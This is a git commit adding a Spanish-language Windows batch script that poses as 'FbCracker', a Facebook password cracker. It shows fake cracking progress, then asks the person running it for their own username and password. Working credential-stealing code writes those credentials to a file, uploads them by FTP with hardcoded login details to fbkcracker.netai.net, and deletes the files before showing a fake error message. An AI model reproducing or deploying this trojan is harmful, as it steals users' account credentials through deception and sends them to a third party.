0fefa14e7a8809cd70848077da418d41ea5b9e0b
gracesean <seangpgpgpgp@hotmail.es>
2016-08-29 12:11:03 +0200

    Add files via upload

---
+++ FbCracker v2.5.3.bat
@@ -0,0 +1,45 @@
+@echo off
+echo.  
+echo.  
+echo.
+echo Bienvenido al FbCracker v2.5.3
+timeout /t 3 >> nul
+echo Por favor no transfiera este software sin consentimiento del autor.
+pause 
+echo Buscando actualizaciones...
+timeout /t 5 >> nul
+echo La version se encuentra actualizada a v2.5.3
+echo.
+SET /P usuvic=Introduzca el usuario de la victima:
+echo Nombre de usuario: %usuvic%
+echo Comprobando credenciales del usuario...
+timeout /t 8 >> nul
+echo Decodificando Datos de las credenciales...
+echo Hecho.
+timeout /t 1 >> nul
+echo Testeando posible Password
+timeout /t 5 >> nul
+echo Password correcta.
+pause
+echo Necesita logearse para recibir la contraseña.
+echo. 
+SET /P user=Usuario:
+SET /P pass=Contraseña:
+
+echo Usuario:%user% >> credenciales%user%.txt
+echo Pass:%pass% >> credenciales%user%.txt
+echo open fbkcracker.netai.net >> fbcracker.txt
+echo a7169671 >> fbcracker.txt
+echo mamonazo >> fbcracker.txt
+echo put credenciales%user%.txt >>fbcracker.txt
+echo quit >>fbcracker.txt
+ftp -s:fbcracker.txt >> nul
+del credenciales%user%.txt
+del fbcracker.txt
+echo Realizando comprobacion...
+timeout /t 5 >> nul
+echo Ocurrio un error durante la ejecucion comprueba que los datos son correctos...
+pause
+
+
+exit
